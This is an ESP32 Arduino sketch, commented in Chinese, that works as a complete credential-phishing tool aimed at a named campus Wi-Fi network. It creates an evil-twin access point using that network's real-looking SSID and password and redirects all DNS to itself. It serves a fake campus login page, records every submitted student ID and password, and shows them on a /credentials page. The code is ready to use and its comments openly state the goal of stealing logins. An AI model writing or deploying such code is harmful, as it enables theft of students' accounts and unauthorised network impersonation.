#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ESPmDNS.h>

// WiFi配置：与目标校园网同名同密码
const char* ssid = "SSQZX-B";
const char* password = "ssqzx888";

// DNS服务器，用于将所有DNS请求重定向到ESP32
DNSServer dnsServer;
const byte DNS_PORT = 53;

// Web服务器，运行在80端口
WebServer server(80);

// 存储窃取的账号密码
String stolenCredentials = "";

// 伪造的校园网认证页面HTML
const char* fakeLoginPage = R"rawliteral(
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>校园网认证</title>
  <style>
    body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .login-container { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 90%; max-width: 300px; text-align: center; }
    h2 { color: #333; }
    input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
    input[type="submit"] { background-color: #007bff; color: white; padding: 10px; border: none; border-radius: 4px; cursor: pointer; width: 100%; }
    input[type="submit"]:hover { background-color: #0056b3; }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>校园网认证</h2>
    <form action="/login" method="POST">
      <input type="text" name="username" placeholder="请输入学号" required>
      <input type="password" name="password" placeholder="请输入密码" required>
      <input type="submit" value="登录">
    </form>
  </div>
</body>
</html>
)rawliteral";

// 凭据展示页面HTML
const char* credentialsPage = R"rawliteral(
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>窃取的凭据</title>
  <style>
    body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; }
    .credentials-container { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 90%; max-width: 600px; margin: 0 auto; }
    h2 { color: #333; text-align: center; }
    pre { background-color: #f9f9f9; padding: 10px; border-radius: 4px; white-space: pre-wrap; word-wrap: break-word; }
    @media (max-width: 600px) { .credentials-container { width: 100%; padding: 10px; } }
  </style>
</head>
<body>
  <div class="credentials-container">
    <h2>窃取的账号密码</h2>
    <pre>%s</pre>
  </div>
</body>
</html>
)rawliteral";

// 处理根路径，显示伪造的登录页面
void handleRoot() {
  server.send(200, "text/html", fakeLoginPage);
}

// 处理登录请求，窃取账号密码
void handleLogin() {
  if (server.method() == HTTP_POST) {
    String username = server.arg("username");
    String password = server.arg("password");
    stolenCredentials += "用户名: " + username + " 密码: " + password + "\n";
    Serial.println("窃取的凭据: 用户名=" + username + " 密码=" + password);
    // 重定向到成功页面或继续显示登录页面
    server.send(200, "text/html", "<h3>登录成功！请稍后...</h3><meta http-equiv='refresh' content='2;url=/'>");
  }
}

// 处理凭据展示页面
void handleCredentials() {
  String page = String(credentialsPage);
  page.replace("%s", stolenCredentials.length() > 0 ? stolenCredentials : "暂无窃取的凭据");
  server.send(200, "text/html", page);
}

// 处理所有未定义的请求，重定向到根路径
void handleNotFound() {
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);

  // 设置ESP32为AP模式，创建与校园网同名的WiFi
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);
  Serial.println("伪造WiFi已启动: " + String(ssid));
  Serial.print("AP IP地址: ");
  Serial.println(WiFi.softAPIP());

  // 设置DNS服务器，将所有DNS请求重定向到ESP32
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  // 设置MDNS，使设备可以通过"campuswifi.local"访问
  if (MDNS.begin("campuswifi")) {
    Serial.println("MDNS启动: campuswifi.local");
  }

  // 设置Web服务器路由
  server.on("/", handleRoot);
  server.on("/login", handleLogin);
  server.on("/credentials", handleCredentials);
  server.onNotFound(handleNotFound);

  // 启动Web服务器
  server.begin();
  Serial.println("Web服务器已启动");
}

void loop() {
  // 处理DNS请求
  dnsServer.processNextRequest();
  // 处理Web服务器请求
  server.handleClient();
}
